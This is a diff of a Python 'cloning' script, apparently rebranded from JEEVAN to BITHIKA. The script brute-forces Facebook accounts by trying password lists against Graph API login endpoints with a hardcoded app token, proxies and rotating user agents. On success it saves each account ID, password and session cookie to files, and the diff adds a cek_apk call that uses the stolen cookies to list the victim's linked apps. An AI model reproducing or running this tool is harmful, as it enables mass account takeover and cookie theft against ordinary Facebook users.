@@ -18,7 +18,7 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python JEEVAN.py')
+        os.system('python BITHIKA.py')
         
 
 #───────────────[FAKE CPTHON]───────────────────────── #
@@ -33,7 +33,7 @@ import os, platform, time, sys
 try:
  import requests
 except:os.system("pip uninstall requests -y;pip install requests")
-print('\033[1;91m[\033[1;97m✓\033[1;91m] \033[1;92mChecking For Update. . . .')
+print('\033[1;91m[\033[1;97m✓\033[1;91m] \033[1;92mLOADING TOOLS BE PATIENT. . . .')
 #os.system('espeak -a 300 " Waiting for Update,"')
 
 time.sleep(2)
@@ -56,7 +56,7 @@ except Exception as e:
 proxies=open('proxies.txt','r').read().splitlines()
 
 
-xx=requests.get('https://raw.githubusercontent.com/JEEVAN-777/Nepalese/main/ua.txt').text.splitlines()
+xx=requests.get('https://raw.githubusercontent.com/BITHIKA-777/Nepalese/main/ua.txt').text.splitlines()
 
 #----------http_canary-------#
 
@@ -155,7 +155,7 @@ def menu():
                         linex()
                         xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                         if xd in ['1','01']:
-                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/JEEVAN.txt ');linex()
+                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/BITHIKA.txt ');linex()
                                 file = input(f'{G}[{A}?{G}]{G} FILE NAME : ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
@@ -244,18 +244,18 @@ def menu():
 #__________________| RANDOM |__________________#
 def randm():
     clear()
-    print(f'{G}[{A}1{G}]{G} BANGLADESH CLONING ')
-    print(f'{G}[{A}2{G}]{G} INDIA CLONING ')
+    print(f'{G}[{A}1{G}]{G} INDIA CLONING ')
+    print(f'{G}[{A}2{G}]{G} BANGLADESH CLONING ')
     print(f'{G}[{A}3{G}]{G} NEPAL CLONING ')
     print(f'{G}[{A}4{G}]{G} PAKISTAN CLONING ')
     print(f'{G}[{A}5{G}]{G} AFGHANISTAN CLONING ')
-    print(f'{G}[{A}6{G}]{G} MALAYSIA CLONING ')
+    print(f'{G}[{A}6{G}]{G} NIGERIA CLONING ')
     print(f'{G}[{A}0{G}]{G} BACK TO MENU ');linex()
     option=input(f'{G}[{A}?{G}]{G} CHOICE : ')
     if option in ['1','A']:
-        bd()
+        india()
     elif option in ['2','B']:
-    	india()
+    	bd()
     elif option in ['3','C']:
     	nepal()
     elif option in ['4','D']:
@@ -496,7 +496,7 @@ def malaysia():
 def api1(ids,names,passlist):
         try:
                 global oks,cps,loop
-                sys.stdout.write(f'\r\r{G}[{R}JEEVAN-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -580,16 +580,17 @@ def api1(ids,names,passlist):
                         url = 'https://graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}JEEVAN-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/JEEVAN-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JEEVAN-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -605,7 +606,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global oks,cps,loop
-                sys.stdout.write(f'\r\r{G}[{R}JEEVAN-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -699,16 +700,17 @@ def api2(ids,names,passlist):
                         url = 'https://graph.facebook.com/method/auth.login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}JEEVAN-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/JEEVAN-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JEEVAN-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -724,7 +726,7 @@ def api2(ids,names,passlist):
 def api3(ids,names,passlist):
         try:
                 global loop,oks,cps
-                sys.stdout.write(f'\r\r{G}[{R}JEEVAN-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -807,16 +809,17 @@ def api3(ids,names,passlist):
                         url = 'https://graph.facebook.com/method/auth.login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}JEEVAN-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/JEEVAN-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JEEVAN-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -835,7 +838,7 @@ def api3(ids,names,passlist):
 def rndm1(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}JEEVAN-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -914,16 +917,17 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}JEEVAN-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/JEEVAN-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -938,7 +942,7 @@ def rndm1(uid,passlist):
 def rndm2(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}JEEVAN-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1014,16 +1018,17 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}JEEVAN-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/JEEVAN-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -1039,7 +1044,7 @@ def rndm2(uid,passlist):
 def rndm3(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}JEEVAN-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -1122,16 +1127,17 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}JEEVAN-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-                                        open('/sdcard/JEEVAN-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        cek_apk(coki)
+                                        open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -1144,9 +1150,9 @@ def rndm3(uid,passlist):
  
 #----------------[ ID-CHECKER ]--------------------------#
 
-def cek_apk(kuki):
+def cek_apk(coki):
 	session = requests.Session()
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -1155,7 +1161,7 @@ def cek_apk(kuki):
 			print ("\r%s  \033[0m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
 	except AttributeError:
 		print ("\r    %s\033[0m cookie invalid"%(M))
-	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
 	sop = bs4.BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
